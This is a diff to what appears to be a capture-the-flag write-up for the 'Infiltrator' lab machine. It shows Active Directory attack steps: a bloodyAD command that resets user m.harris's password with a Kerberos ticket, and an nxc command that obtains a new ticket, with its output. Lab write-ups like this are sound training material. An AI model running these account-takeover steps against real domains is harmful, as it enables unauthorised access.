@@ -412,7 +412,7 @@ Ill get a TGT for the `e.rodriguez` user
 export KRB5CCNAME=e.rodriguez.ccache
 ```
 
-Ill e
+Ill export the TGT
 
 ```python
 bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'm.harris' 'Password123!'
@@ -420,6 +420,15 @@ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'm.harri
 ```
 
 Then ill change the users password
+
+```python
+nxc smb dc01.infiltrator.htb -u m.harris -p 'Password123!' -k --generate-tgt m.harris
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\m.harris:Password123! 
+SMB         dc01.infiltrator.htb 445    DC01             [+] TGT saved to: m.harris.ccache
+SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=m.harris.ccache
+```
+
 
 # Enumeration as `m.harris`
 
